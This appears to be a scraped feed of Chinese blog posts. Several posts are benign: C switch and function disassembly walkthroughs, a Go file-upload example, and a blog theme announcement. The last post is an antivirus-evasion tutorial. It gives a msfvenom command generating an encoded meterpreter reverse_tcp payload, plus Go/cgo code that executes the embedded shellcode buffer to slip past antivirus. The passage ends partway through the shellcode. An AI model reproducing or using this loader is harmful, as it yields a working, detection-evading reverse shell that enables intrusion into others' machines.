(0040d80e) 11: case 6: 12: printf(\u0026#34;%d\\n\u0026#34;,x); 0040D7B1 mov ecx,dword ptr [ebp-4] 0040D7B4 push ecx 0040D7B5 push offset string \u0026#34;%d\\n\u0026#34; (0042201c) 0040D7BA call printf (004010d0) 0040D7BF add esp,8 13: break; 0040D7C2 jmp $L537+24h (0040d80e) 14: case 7: 15: printf(\u0026#34;%d\\n\u0026#34;,x); 0040D7C4 mov edx,dword ptr [ebp-4] 0040D7C7 push edx 0040D7C8 push offset string \u0026#34;%d\\n\u0026#34; (0042201c) 0040D7CD call printf (004010d0) 0040D7D2 add esp,8 16: break; 0040D7D5 jmp $L537+24h (0040d80e) 17: case 8: 18: printf(\u0026#34;%d\\n\u0026#34;,x); 0040D7D7 mov eax,dword ptr [ebp-4] 0040D7DA push eax 0040D7DB push offset string \u0026#34;%d\\n\u0026#34; (0042201c) 0040D7E0 call printf (004010d0) 0040D7E5 add esp,8 19: break; 0040D7E8 jmp $L537+24h (0040d80e) 20: case 9: 21: printf(\u0026#34;%d\\n\u0026#34;,x); 0040D7EA mov ecx,dword ptr [ebp-4] 0040D7ED push ecx 0040D7EE push offset string \u0026#34;%d\\n\u0026#34; (0042201c) 0040D7F3 call printf (004010d0) 0040D7F8 add esp,8 22: break; 0040D7FB jmp $L537+24h (0040d80e) 23: default: 24: printf(\u0026#34;%d\\n\u0026#34;,x); 0040D7FD mov edx,dword ptr [ebp-4] 0040D800 push edx 0040D801 push offset string \u0026#34;%d\\n\u0026#34; (0042201c) 0040D806 call printf (004010d0) 0040D80B add esp,8 25: break; 26: } è·³è½¬è¡¨ä»[edx*4+40D81Fh]å–å‡ºåˆ†æ”¯çš„åœ°å€å€¼ç„¶åè¿›è¡Œjmpï¼Œä¸‹è¡¨æ˜¯è·³è½¬è¡¨éƒ¨åˆ†\n1 2 3 4 5 0040D81F 9E D7 40 00 ..@. 0040D823 B1 D7 40 00 ..@. 0040D827 C4 D7 40 00 ..@. 0040D82B D7 D7 40 00 ..@. 0040D82F EA D7 40 00 ..@. 0x03åˆ†æ”¯è·ƒåº¦å¤§éš¾ä»¥æ„æˆè·³è½¬è¡¨çš„åˆ†æ”¯ç»“æ„ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include \u0026lt;stdio.h\u0026gt; void main() { int x = 5; switch(x) { case 5: printf(\u0026#34;%d\\n\u0026#34;,x); break; case 6: printf(\u0026#34;%d\\n\u0026#34;,x); break; case 7: printf(\u0026#34;%d\\n\u0026#34;,x); break; case 8: printf(\u0026#34;%d\\n\u0026#34;,x); break; case 100: printf(\u0026#34;%d\\n\u0026#34;,x); break; default: printf(\u0026#34;%d\\n\u0026#34;,x); break; } return; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 5: int x = 5; 00401028 mov dword ptr [ebp-4],5 6: switch(x) 7: { 0040102F mov eax,dword ptr [ebp-4] 00401032 mov dword ptr [ebp-8],eax 00401035 mov ecx,dword ptr [ebp-8] 00401038 sub ecx,5 0040103B mov dword ptr [ebp-8],ecx 0040103E cmp dword ptr [ebp-8],5Fh 00401042 ja $L536+13h (004010b5) //å…·ä½“å‚è§ä¸Šä¸€ç§,xå¤§äº100è·³è½¬åˆ°default 00401044 mov eax,dword ptr [ebp-8] //edx=x-5 00401047 xor edx,edx //edxç½®é›¶ 00401049 mov dl,byte ptr (004010ef)[eax] //æŸ¥è¯¢ç´¢å¼•è¡¨å¹¶å°†å–å‡ºæ¥çš„å€¼æ”¾å…¥DL(åœ¨odé‡Œé¢çš„è¿™æ¡åæ±‡ç¼–æ›´æ¸…æ¥š) 0040104F jmp dword ptr [edx*4+4010D7h] //æ ¹æ®DL(EDX)çš„å€¼æŸ¥è·³è½¬è¡¨ 8: case 5: 9: printf(\u0026#34;%d\\n\u0026#34;,x); 00401056 mov ecx,dword ptr [ebp-4] 00401059 push ecx 0040105A push offset string \u0026#34;%d\\n\u0026#34; (0042201c) 0040105F call printf (004011a0) 00401064 add esp,8 10: break; 00401067 jmp $L536+24h (004010c6) 11: case 6: 12: printf(\u0026#34;%d\\n\u0026#34;,x); 00401069 mov edx,dword ptr [ebp-4] 0040106C push edx 0040106D push offset string \u0026#34;%d\\n\u0026#34; (0042201c) 00401072 call printf (004011a0) 00401077 add esp,8 13: break; 0040107A jmp $L536+24h (004010c6) 14: case 7: 15: printf(\u0026#34;%d\\n\u0026#34;,x); 0040107C mov eax,dword ptr [ebp-4] 0040107F push eax 00401080 push offset string \u0026#34;%d\\n\u0026#34; (0042201c) 00401085 call printf (004011a0) 0040108A add esp,8 16: break; 0040108D jmp $L536+24h (004010c6) 17: case 8: 18: printf(\u0026#34;%d\\n\u0026#34;,x); 0040108F mov ecx,dword ptr [ebp-4] 00401092 push ecx 00401093 push offset string \u0026#34;%d\\n\u0026#34; (0042201c) 00401098 call printf (004011a0) 0040109D add esp,8 19: break; 004010A0 jmp $L536+24h (004010c6) 20: case 100: 21: printf(\u0026#34;%d\\n\u0026#34;,x); 004010A2 mov edx,dword ptr [ebp-4] 004010A5 push edx 004010A6 push offset string \u0026#34;%d\\n\u0026#34; (0042201c) 004010AB call printf (004011a0) 004010B0 add esp,8 22: break; 004010B3 jmp $L536+24h (004010c6) 23: default: 24: printf(\u0026#34;%d\\n\u0026#34;,x); 004010B5 mov eax,dword ptr [ebp-4] 004010B8 push eax 004010B9 push offset string \u0026#34;%d\\n\u0026#34; (0042201c) 004010BE call printf (004011a0) 004010C3 add esp,8 25: break; 26: } ç´¢å¼•è¡¨\n1 2 3 4 5 6 7 8 9 10 11 12 004010F1 00 01 02 03 05 05 05 05 ........ 004010F9 05 05 05 05 05 05 05 05 ........ 00401101 05 05 05 05 05 05 05 05 ........ 00401109 05 05 05 05 05 05 05 05 ........ 00401111 05 05 05 05 05 05 05 05 ........ 00401119 05 05 05 05 05 05 05 05 ........ 00401121 05 05 05 05 05 05 05 05 ........ 00401129 05 05 05 05 05 05 05 05 ........ 00401131 05 05 05 05 05 05 05 05 ........ 00401139 05 05 05 05 05 05 05 05 ........ 00401141 05 05 05 05 05 05 05 05 ........ 00401149 05 05 05 05 05 05 05 04 ........ è·³è½¬è¡¨\n1 2 3 4 5 6 004010D9 58 10 40 00 X.@. 004010DD 6B 10 40 00 k.@. 004010E1 7E 10 40 00 ~.@. 004010E5 91 10 40 00 ..@. 004010E9 A4 10 40 00 ..@. 004010ED B7 10 40 00 ..@. ","permalink":"https://www.hacktech.cn/post/switch%E5%8F%8D%E6%B1%87%E7%BC%96-c%E8%AF%AD%E8%A8%80.html","summary":"\u003cp\u003eåœ¨åˆ†æ”¯è¾ƒå¤šçš„æ—¶å€™ï¼Œswitchçš„æ•ˆç‡æ¯”ifé«˜ï¼Œåœ¨åæ±‡ç¼–ä¸­æˆ‘ä»¬å³å¯çœ‹åˆ°æ•ˆç‡é«˜çš„åŸå› \u003c/p\u003e","title":"switchåæ±‡ç¼–(Cè¯­è¨€)"},{"content":"0x01 ç¯å¢ƒ xp+vc6.0\n0x02 ä»£ç  1 2 3 4 int plus(int x, int y) { return 0; } ä»¥ä¸‹æ˜¯vc6.0çš„åæ±‡ç¼–çª—å£\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 1: int plus(int x, int y) 2: { 00401020 push ebp 00401021 mov ebp,esp 00401023 sub esp,40h 00401026 push ebx 00401027 push esi 00401028 push edi 00401029 lea edi,[ebp-40h] 0040102C mov ecx,10h 00401031 mov eax,0CCCCCCCCh 00401036 rep stos dword ptr [edi] 3: return 0; 00401038 xor eax,eax 4: } 0040103A pop edi 0040103B pop esi 0040103C pop ebx 0040103D mov esp,ebp 0040103F pop ebp 00401040 ret 0x03 åˆ†æ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 push ebp mov ebp,esp sub esp,40h //æå‡æ ˆï¼Œä¸ºå‡½æ•°è…¾å‡ºç©ºé—´ï¼Œä¸ºebpå¯»å€åšå‡†å¤‡ push ebx push esi push edi //å¯„å­˜å™¨å‹æ ˆï¼Œä¿å­˜ç°åœº lea edi,[ebp-40h] //å°†ebp-40hï¼ˆespï¼‰çš„å…·ä½“å†…å­˜åœ°å€å­˜åˆ°edi mov ecx,10h //10ï¼ˆåå…­è¿›åˆ¶ï¼‰å­˜å…¥è®¡æ•°å¯„å­˜å™¨ mov eax,0xCCCCCCCC //åˆå§‹åŒ–eax rep stos dword ptr [edi] //ç”¨eaxä¸­çš„å€¼åˆå§‹åŒ–åˆ°es:[edi]æŒ‡å‘çš„åœ°å€ï¼Œé•¿åº¦ä¸ºdwordï¼Œå¾ªç¯æ‰§è¡Œæ¬¡æ•°ä¸ºeaxä¸­çš„å€¼ï¼ˆæ°å¥½ebp-\u0026gt;espå…¨éƒ¨è¢«åˆå§‹åŒ–ï¼‰ xor eax,eax //eaxæ¸…é›¶ pop edi pop esi pop ebx mov esp,ebp pop ebp ret //å¯„å­˜å™¨å‡ºæ ˆï¼Œæ¢å¤ç°åœºï¼Œå †æ ˆå¹³è¡¡å¹¶è¿”å› ","permalink":"https://www.hacktech.cn/post/%E6%9C%80%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84c%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90.html","summary":"\u003ch2 id=\"0x01-ç¯å¢ƒ\"\u003e0x01 ç¯å¢ƒ\u003c/h2\u003e\n\u003cp\u003exp+vc6.0\u003c/p\u003e\n\u003ch2 id=\"0x02-ä»£ç \"\u003e0x02 ä»£ç \u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e4\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eplus\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e x, \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e y)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e","title":"æœ€æœ€ç®€å•çš„cè¯­è¨€å‡½æ•°æ±‡ç¼–åˆ†æ"},{"content":"å®¢æˆ·ç«¯é€šè¿‡multipart.WriteæŠŠæ–‡ä»¶çš„æ–‡æœ¬æµå†™å…¥ä¸€ä¸ªç¼“å­˜ä¸­ï¼Œç„¶åè°ƒç”¨httpçš„Postæ–¹æ³•æŠŠç¼“å­˜ä¼ åˆ°æœåŠ¡å™¨ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package main import ( \u0026#34;bytes\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;mime/multipart\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; ) func postFile(filename string, targetUrl string) error { bodyBuf := \u0026amp;bytes.Buffer{} bodyWriter := multipart.NewWriter(bodyBuf) //å…³é”®çš„ä¸€æ­¥æ“ä½œ fileWriter, err := bodyWriter.CreateFormFile(\u0026#34;uploadfile\u0026#34;, filename) if err != nil { fmt.Println(\u0026#34;error writing to buffer\u0026#34;) return err } //æ‰“å¼€æ–‡ä»¶å¥æŸ„æ“ä½œ fh, err := os.Open(filename) if err != nil { fmt.Println(\u0026#34;error opening file\u0026#34;) return err } defer fh.Close() //iocopy _, err = io.Copy(fileWriter, fh) if err != nil { return err } contentType := bodyWriter.FormDataContentType() bodyWriter.Close() resp, err := http.Post(targetUrl, contentType, bodyBuf) if err != nil { return err } defer resp.Body.Close() resp_body, err := ioutil.ReadAll(resp.Body) if err != nil { return err } fmt.Println(resp.Status) fmt.Println(string(resp_body)) return nil } // sample usage func main() { target_url := \u0026#34;http://localhost/upload\u0026#34; filename := \u0026#34;./example.pdf\u0026#34; postFile(filename, target_url) } ","permalink":"https://www.hacktech.cn/post/golang%E6%A8%A1%E6%8B%9F%E5%AE%A2%E6%88%B7%E7%AB%AFpost%E8%A1%A8%E5%8D%95%E5%8A%9F%E8%83%BD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html","summary":"\u003cp\u003eå®¢æˆ·ç«¯é€šè¿‡multipart.WriteæŠŠæ–‡ä»¶çš„æ–‡æœ¬æµå†™å…¥ä¸€ä¸ªç¼“å­˜ä¸­ï¼Œç„¶åè°ƒç”¨httpçš„Postæ–¹æ³•æŠŠç¼“å­˜ä¼ åˆ°æœåŠ¡å™¨ã€‚\u003c/p\u003e","title":"Golangæ¨¡æ‹Ÿå®¢æˆ·ç«¯POSTè¡¨å•åŠŸèƒ½æ–‡ä»¶ä¸Šä¼ "},{"content":"å‰è¨€ å…³äºè¿™ä¸ªä¸»é¢˜çš„ç§»æ¤åå…¬å¸ƒï¼Œæˆ‘å·²ç»è”ç³»äº†ä¸»é¢˜ä½œè€…å¹¶å–å¾—åŒæ„ï¼Œè¿™ä¸ªä¸»é¢˜æ˜¯ä¸€å¤œæ¶•æ‰€å†™çš„Sgreenï¼Œé¢„è§ˆå›¾è§ä¸‹\nå…³äºWDTP å°±æ˜¯ä¸€ä¸ªå¾ˆæ–¹ä¾¿å¾ˆä¾¿æºå¾ˆå¿«é€Ÿçš„cppç¼–å†™çš„å¸¦guiè·¨å¹³å°çš„å¼€æºçš„é™æ€åšå®¢ç”Ÿæˆå™¨ï¼Œè½¯ä»¶ä½œè€…æ›´æ–°è®°å½•åœ¨Vç«™å¯ä»¥æ‰¾åˆ°,è½¯ä»¶å®˜ç½‘ä¹Ÿå¯ä»¥æ‰¾åˆ°\nä¸»é¢˜é¢„è§ˆå›¾ DEMO Demo\nåŠŸèƒ½ å†…ç½®ä¸¤ç§é¢œè‰²çš„cssï¼Œæ ¹æ®ç™½å¤©å¤œæ™šæ§åˆ¶è¿›è¡Œæ›¿æ¢ WDTPé¢„è§ˆé‡‡ç”¨çš„ieå†…æ ¸ï¼ŒQplayerçš„player.jsæ–‡ä»¶ä¼šä¸€ç›´çˆ†è¯­æ³•é”™è¯¯ï¼Œå¢åŠ äº†ä¸€æ®µjsç”¨æ¥åˆ¤æ–­æ˜¯å¦æ˜¯ieå†…æ ¸çš„æµè§ˆå™¨ï¼Œå¦‚æœä¸æ˜¯ieå†…æ ¸æ‰ä¼šåŠ è½½player.js æ•°éç§»æ¤é“¾æ¥æŠ–åŠ¨ç‰¹æ•ˆ é¼ æ ‡ç§»è‡³å¤´åƒä¸ç¤¾äº¤å›¾æ ‡ä¼šæœ‰æ—‹è½¬æ•ˆæœ QplayeréŸ³ä¹æ’­æ”¾å™¨ zoomå›¾ç‰‡æ•ˆæœ å¤åˆ¶æ—¶ä¼šå‡ºç°ç‰ˆæƒå¼¹çª—æç¤ºï¼Œå¤åˆ¶çš„æ–‡æœ¬ä¹Ÿå¸¦æœ‰ç‰ˆæƒä¿¡æ¯ å¼¹çª—é‡‡ç”¨sweetalert æ‰‹æœºç«¯çš„é€‚é… å®‰è£…è¯´æ˜ å®‰è£…WDTPå¹¶æ–°å»ºé¡¹ç›®åç‚¹å‡»ä¸­é—´é½¿è½®å¯¼å…¥å¤–éƒ¨ä¸»é¢˜ï¼Œç„¶ååœ¨å³ä¾§å±æ€§é¢æ¿é€‰æ‹©ä¸»é¢˜Sgreen ç„¶åæ ¹èŠ‚ç‚¹æ–°å»ºä¸‰ä¸ªæ–‡ä»¶ï¼Œåç§°åˆ†åˆ«ä¸ºarchives,about,linkså¹¶åœ¨å³ä¾§å±æ€§é¢æ¿æŠŠä¸‰ä¸ªæ–‡æ¡£è®¾ç½®ä¸ºéšèº«æ¨¡å¼ï¼ˆä¹Ÿå°±æ˜¯ä¸å‚ä¸æ•´ç«™åšå®¢ç›®å½•ç”Ÿæˆï¼Œä½†æ˜¯htmlæ–‡ä»¶éƒ½å­˜åœ¨ï¼‰ ç‚¹å‡»ä¸Šæ–¹çœ¼ç›å›¾æ ‡å¯ä»¥è¿›å…¥ç¼–è¾‘ç•Œé¢ï¼Œç¼–è¾‘ç•Œé¢å³é”®-æ‰©å±•æ ‡è®°-å‘å¸ƒè®°å½•ï¼Œå¯ä»¥å¢åŠ æ—¶é—´å½’æ¡£æ ‡è®° æ›´å¤šç©æ³•å¯ä»¥è‡ªå·±å‘æ˜æˆ–è€…è½¯ä»¶å¸®åŠ©çœ‹è¯´æ˜\nä¸»é¢˜ä¸‹è½½åœ°å€ ç‚¹å‡»æˆ‘ä¸‹è½½\n","permalink":"https://www.hacktech.cn/post/sgreen-on-wdtp.html","summary":"\u003ch2 id=\"å‰è¨€\"\u003eå‰è¨€\u003c/h2\u003e\n\u003cp\u003eå…³äºè¿™ä¸ªä¸»é¢˜çš„ç§»æ¤åå…¬å¸ƒï¼Œæˆ‘å·²ç»è”ç³»äº†ä¸»é¢˜ä½œè€…å¹¶å–å¾—åŒæ„ï¼Œè¿™ä¸ªä¸»é¢˜æ˜¯\u003ca href=\"http://yiyeti.cc/\"\u003eä¸€å¤œæ¶•\u003c/a\u003eæ‰€å†™çš„\u003ca href=\"http://yiyeti.cc/zheteng/132.html\"\u003eSgreen\u003c/a\u003eï¼Œé¢„è§ˆå›¾è§ä¸‹\u003c/p\u003e","title":"ä¸ºé™æ€åšå®¢ç”Ÿæˆå™¨WDTPç§»æ¤äº†ä¸€æ¬¾ç¾ç¾å“’ä¸»é¢˜"},{"content":"msfæ˜¯ä¸€ä¸ªå¾ˆå¼ºå¤§çš„å·¥å…·ï¼Œæˆ‘ç»å¸¸ä¼šåœ¨æ¸—é€ç”¨å®ƒæ¥åå¼¹shellï¼Œä¸è¿‡å®ƒç”Ÿæˆçš„åå¼¹åé—¨ä¼šè¢«ä¸å°‘æ€è½¯killï¼Œè¿™ç¯‡æ–‡ç« åªæ˜¯è®²è®²æˆ‘åœ¨msfä¸­ä¸€ä¸ªç®€å•çš„å…æ€å°æŠ€å·§\næ€è·¯ æˆ‘ä»¥å‰æ¥è§¦è¿‡ä¸€æ¬¾pythonçš„è¿œæ§ï¼Œå…¶å®è¯´æ˜¯è¿œæ§ï¼ŒåŸºæœ¬ä¹Ÿå°±æ˜¯ncçš„åŠŸèƒ½åŠ äº†ä¸€ä¸ªæœåŠ¡ç«¯çš„webé¡µé¢æ§åˆ¶å¹¶åŠ äº†ä¸€äº›å…¶ä»–çš„åŠŸèƒ½å¯ä»¥ç”¨æ¥ç®¡ç†è¯¸å¤šå®¢æˆ·æœº è¿™æ¬¾è¿œæ§æˆ‘ä¸‹è½½ä¸‹æ¥ç”¨è¿‡ï¼Œå¹¶ç”¨pyinstalleræ‰“åŒ…æˆäº†exeï¼ˆç¼ºç‚¹æ˜¯ä½“ç§¯å¤ªè¿‡åºå¤§ï¼‰ï¼ŒæƒŠå¥‡çš„æ˜¯ï¼Œ360ä¸æ€å®ƒï¼Œç„¶åè‡ªå·±æƒ³ç€å…¶ä»–è¯­è¨€æ˜¯ä¸æ˜¯ä¹Ÿä¼šè¿™æ ·ï¼Œäºæ˜¯æˆ‘ç”¨golangå†™äº†ä¸€ä¸ªç®€æ˜“ç‰ˆncåå¼¹ï¼Œç¼–è¯‘ä¹‹åï¼Œä¹Ÿæ˜¯ä¸æŸ¥æ€çš„ã€‚pythonå’Œgolangæœ‰ä¸€ä¸ªå…±åŒç‚¹ï¼Œå°±æ˜¯å¯ä»¥ç”¨æ¥å†…è”Cç¼–ç¨‹ï¼Œæ‰€ä»¥Cè¯­è¨€çš„shellcodeæŒ‰ç†è¯´åº”è¯¥ä¼šè¾¾åˆ°åŒæ ·çš„æ•ˆæœ\nå¾—åˆ°shellcode 1 msfvenom -p windows/meterpreter/reverse_tcp LPORT=5555 LHOST=192.168.1.100 -e x86/shikata_ga_nai -i 11 -f py \u0026gt; 1.py å»ºè®®æ˜¯ç”Ÿæˆ32ä½çš„ï¼Œå¦‚æœæƒ³ç”Ÿæˆ64ä½ä¹Ÿå¯ä»¥ï¼Œ-e x86/shikata_ga_nai -i 11æ˜¯æŒ‡ç”¨x86/shikata_ga_naiç¼–ç è¿­ä»£11æ¬¡ï¼Œç„¶åç”Ÿæˆpyæ–‡ä»¶ pyæ–‡ä»¶æ‰“å¼€æ˜¯shellcodeï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å¯¹å®ƒè¿›è¡Œä¸€ç‚¹å°æ”¹é€ ï¼Œå¯¹äºpythonå»æ‰§è¡Œshellcodeçš„æ–¹æ³•ï¼Œç›¸ä¿¡å°ä¼™ä¼´éƒ½å·²ç»ä¸é™Œç”Ÿï¼Œåœ¨ã€Špythonç°å¸½å­ã€‹ä¸­æœ‰è®²è§£ï¼Œæˆ‘ä»Šå¤©è¦ä½¿ç”¨çš„æ˜¯golangï¼Œå…¶å®ä¸ªäººè®¤ä¸ºgolangæ‰§è¡Œshellcodeçš„ä»£ç æ˜¯æ›´ç®€æ´çš„\nGolangç¯å¢ƒæ­å»º å®‰è£…Golang32ä½ï¼ˆå»ºè®®32ä½ï¼Œä¸å‰é¢å¯¹åº”ï¼Œåœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå¦‚æœ32ä½shellcodeé…åˆ64ä½golangåŠ 32ä½gccï¼Œå°±ç®—æŠŠgolangçš„GOARCHæ”¹ä¸º386ä¹Ÿä¾æ—§ä¼šå¤±è´¥ï¼Œå»ºè®®ä¸€ä¸€å¯¹åº”ï¼‰ï¼Œå®‰è£…gcc32ä½ï¼ˆå¯ä»¥ä½¿ç”¨TDM-GCCï¼‰\nä»£ç ç¼–å†™ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 package main /* void call(char *code) { int (*ret)() = (int(*)())code; ret(); } */ import \u0026#34;C\u0026#34; import \u0026#34;unsafe\u0026#34; func main() { buf := \u0026#34;\u0026#34; buf += \u0026#34;\\xdd\\xc6\\xd9\\x74\\x24\\xf4\\x5f\\x33\\xc9\\xb8\\xb3\\x5e\\x2c\u0026#34; buf += \u0026#34;\\xc9\\xb1\\x97\\x31\\x47\\x1a\\x03\\x47\\x1a\\x83\\xc7\\x04\\xe2\u0026#34; buf += \u0026#34;\\x46\\x84\\xfd\\x72\\xee\\x0e\\xb5\\x96\\x37\\x04\\x6d\\x63\\x9f\u0026#34; buf += \u0026#34;\\xcc\\xa4\\x3a\\x8e\\x8c\\xf7\\x39\\x81\\xca\\xe4\\x42\\xff\\xce\u0026#34; buf += \u0026#34;\\xa3\\xa2\\xdb\\x06\\xc0\\x3f\\xaf\\x41\\x73\\xba\\xf7\\x20\\x13\u0026#34; buf += \u0026#34;\\x98\\x8c\\xff\\xfa\\x0a\\xda\\x6e\\xf2\\x6d\\xc3\\x81\\x07\\xc0\u0026#34; buf += \u0026#34;\\x1b\\x37\\xeb\\xa2\\xa9\\x32\\x71\\xaf\\xe9\\x20\\xd1\\xaa\\x9e\u0026#34; buf += \u0026#34;\\xbd\\x82\\xf3\\x81\\x1f\\xab\\xbf\\xc4\\xd9\\x6c\\x75\\x37\\x3a\u0026#34; buf += \u0026#34;\\x53\\x78\\x90\\x79\\xaf\\x93\\x1b\\xb3\\x15\\x09\\xe5\\x45\\x5c\u0026#34; buf += \u0026#34;\\x26\\x0f\\x0d\\x16\\x52\\xf1\\x8a\\x7e\\x8b\\xc4\\x50\\x8e\\x0a\u0026#34; buf += \u0026#34;\\x38\\x2f\\x2b\\x40\\x73\\x0b\\xf0\\x51\\x5f\\xc6\\xbf\\x04\\x47\u0026#34; buf += \u0026#34;\\x80\\x36\\xe5\\x88\\x88\\xb3\\xfc\\xa0\\x52\\xfe\\x92\\x81\\x8d\u0026#34; buf += \u0026#34;\\x89\\xf2\\x6a\\xcc\\x7f\\x9a\\xe9\\x1a\\x30\\x73\\xa3\\x63\\x42\u0026#34; buf += \u0026#34;\\x10\\xe9\\xcf\\x62\\xe4\\x06\\x52\\xe1\\x8d\\x88\\xfe\\x52\\xc4\u0026#34; buf += \u0026#34;\\xc3\\xed\\x7a\\x0e\\x66\\x5f\\x8c\\x2c\\xef\\xfa\\xbd\\x8c\\x79\u0026#34; buf += \u0026#34;\\x6c\\x01\\xe3\\x5c\\xde\\xc4\\x8a\\x4c\\x7d\\x34\\x32\\xb5\\x23\u0026#34; buf += \u0026#34;\\x56\\x6c\\x52\\x3f\\x15\\x26\\x6a\\xf8\\x6b\\x81\\x2c\\x23\\x8d\u0026#34; buf += \u0026#34;\\x41\\x6e\\x24\\x30\\xc6\\xcb\\xba\\x26\\xd4\\x3b\\x37\\xd3\\xc6\u0026#34; buf += \u0026#34;\\xa8\\x5a\\x16\\x8f\\x1e\\x27\\xca\\xcb\\xda\\x7f\\x74\\x62\\xb2\u0026#34; buf += \u0026#34;\\x62\\xa6\\xb1\\xfc\\x64\\x53\\x3a\\xa7\\xa4\\x21\\x3d\\x79\\x08\u0026#34; buf += \u0026#34;\\x06\\x74\\x2a\\xa2\\xe7\\x0d\\x68\\x16\\xa3\\x96\\xe5\\xad\\x32\u0026#34; buf += \u0026#34;\\x10\\xa3\\x0f\\x49\\xc3\\x69\\xa7\\x5b\\x61\\x1a\\xf8\\x1d\\x9e\u0026#34; buf += \u0026#34;\\x9b\\x3a\\x00\\xfc\\x18\\xc3\\x42\\x1a\\xd6\\x44\\x5d\\xfe\\xc5\u0026#34; buf += \u0026#34;\\xb6\\x68\\xd2\\xad\\x24\\xda\\x74\\xa7\\xf3\\x66\\x9a\\x42\\x7a\u0026#34; buf += \u0026#34;\\x50\\xf0\\x0b\\x47\\xbc\\xad\\x6c\\x1e\\xca\\xbe\\x90\\xca\\xc3\u0026#34; buf += \u0026#34;\\x8e\\x5b\\xde\\x66\\xe2\\xb3\\x20\\x6f\\x38\\x17\\xc1\\xac\\xfb\u0026#34; buf += \u0026#34;\\xd3\\x2f\\x91\\xa7\\xff\\x65\\xd7\\xd0\\x25\\x4c\\xd4\\xb3\\x35\u0026#34; buf += \u0026#34;\\x38\\xa1\\x82\\xb8\\x23\\x42\\xe9\\xa5\\x95\\x8e\\xc4\\x35\\xca\u0026#34; buf += \u0026#34;\\x92\\xfe\\xde\\x62\\x70\\xd6\\x7a\\x7f\\xfd\\xfb\\xf0\\x24\\xbd\u0026#34; buf += \u0026#34;\\x5d\\x6d\\x3d\\x13\\xbc\\x1d\\x25\\x54\\x9d\\x0e\\x68\\xc8\\x9a\u0026#34; buf += \u0026#34;\\x10\\x87\\xf0\\xc9\\xac\\x37\\x57\\x84\\x23\\x5f\\x8a\\xc0\\xab\u0026#34; buf += \u0026#34;\\x52\\x6e\\xae\\x79\\xa2\\xdb\\xff\\xd8\\x41\\x28\\x8b\\xd3\\x9d\u0026#34; buf += \u0026#34;\\x68\\x3c\\x55\\xf2\\xfe\\x0c\\x8a\\x38\\xdf\\xb3\\x80\\x9b\\x70\u0026#34; buf += \u0026#34;\\x2b\\x4e\\xe1\\xfa\\x0b\\xfe\\xf5\\xc3\\x1a\\x0d\\x83\\xb0\\x69\u0026#34; buf += 